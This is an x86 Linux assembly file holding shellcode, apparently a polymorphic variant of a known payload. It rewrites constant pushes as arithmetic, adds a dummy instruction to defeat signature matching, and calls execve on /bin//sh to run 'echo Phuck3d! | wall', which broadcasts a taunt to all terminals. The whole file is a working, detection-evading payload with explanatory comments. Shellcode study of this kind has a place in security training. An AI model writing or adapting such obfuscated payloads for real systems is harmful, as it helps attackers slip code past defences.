global _start

section .text
_start:

XOR EDX,EDX
ADD EDX, 0x16
SAR EDX, 1
XCHG EAX,EDX
;-----------
;	push   0xb		;push 11 on the stack
;	pop    eax		;store the value 11 on the stack
;-----------
	cdq			;convert the 32-bit value in eax to the 64-bit value in edx:eax,
				;overwriting anything in edx with either 0's (if eax is positive) or F's (if eax is negative).
				;So edx becomes 0

	push   edx              ;Push 0 on the stack, null terminate the next strings

MOV DWORD [ESP-4], 0x6c6c6177
MOV DWORD [ESP-8], 0x207c2021
SUB ESP,8
;-----------
;	push   0x6c6c6177	;"llaw"
;	push   0x207c2021	;" | !"
;-----------

	push   0x64336b63	;"d3kc"
	push   0x75685020	;"uhP "
	push   0x6f686365	;"ohce"
	mov    esi,esp		;Reference the top of the stack through ESI, ESI now points to "echo Phuck3d! | wall"
	
	push   edx		;Push 0 on the stack, null terminate the next strings
	push word  0x632d	;this is "-c" 
	mov    ecx,esp		;save pointer of parameters to ECX

	push   edx 		;EDX is still 0, hasnt changed, null terminate the next strings	



	push   0x68732f2f	;"hs//"

MOV DI, 0x6e69 		;Store 0x6e69 = "ni" in DI 
PUSH DI 		;Push on the stack the "ni"
TEST DI, SI 		;dummy instruction, doesnt serve any real purpose
SUB DI, 0xC3A 		;Subtract 0xC3A from 0x6e69 gives us 0x622f = "b/"
PUSH DI 		;Push on the stack the "b/"
			;The last two PUSHes create the "nib/"
;-----------
;	push   0x6e69622f	;"nib/"
;----------
	mov    ebx,esp		;save pointer of parameters to EBX

	push   edx		;EDX is still 0, hasnt changed
	push   esi		;Push pointer to "echo Phuck3d! | wall" on the stack
	push   ecx		;Push pointer of "-c" 
	push   ebx		;Push pointer of /bin//sh on the stack
	mov    ecx,esp		;Save pointer of all sendto parameters to ecx
	int    0x80		;invoke syscall (EAX=11 (#define __NR_execve 11)

;int execve(const char *filename, char *const argv[],                         char *const envp[])
;    execve(          "/bin//sh", ["/bin//sh", "-c", "echo Phuck3d! | wall"], 0                 ) 
